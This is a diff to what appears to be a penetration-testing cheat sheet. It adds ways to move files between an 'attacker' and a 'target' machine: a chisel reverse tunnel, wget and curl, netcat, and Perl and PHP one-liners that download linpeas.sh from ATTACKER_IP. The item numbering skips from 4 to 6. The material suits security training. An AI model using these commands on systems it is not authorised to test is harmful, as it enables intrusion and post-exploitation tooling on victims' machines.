@@ -42,7 +42,7 @@ chmod +x chisel
 ./chisel client IP:8000 R:PORTTOFORWARD:IPTOFORWARD:PORTTOFORWARD
 ```
 
-### 📂 Transferring Files (Attacker \(\leftrightarrow \) Target)
+### 📂 Transferring Files (Attacker <-> Target)
 
 1. Bash /dev/tcp Method (No Tools Required) 
 If bash (version 2.04+) is installed and compiled with –enable-net-redirections (standard on most Linux), you can use bash built-ins to open a TCP connection to an attacker's HTTP server. 
@@ -69,4 +69,29 @@ Target Machine (using available tool):
 wget http://ATTACKER_IP/linpeas.sh
 # Option B: curl
 curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh
+```
+3. Netcat (nc) File Transfer 
+If nc is available on the target, it can be used to send binary files directly. 
+Target Machine (Receiver):
+```bash
+nc -lvp 4444 > linpeas.sh
+```
+Attacker Machine (Sender):
+```bash
+nc ATTACKER_IP 4444 < linpeas.sh
+```
+4. Perl/PHP/Ruby Download
+Sometimes languages like Perl, PHP, or Ruby are present when tools like wget are not. 
+Perl:
+```bash
+perl -e 'use LWP::Simple; getstore("http://ATTACKER_IP/linpeas.sh", "linpeas.sh");'
+```
+PHP:
+```bash
+php -r '$file = file_get_contents("http://ATTACKER_IP/linpeas.sh"); file_put_contents("linpeas.sh",$file);'
+```
+6. SSH/SCP
+If you have credentials for an SSH service running on the target.
+```bash
+scp linpeas.sh user@TARGET_IP:/tmp/linpeas.sh
 ```
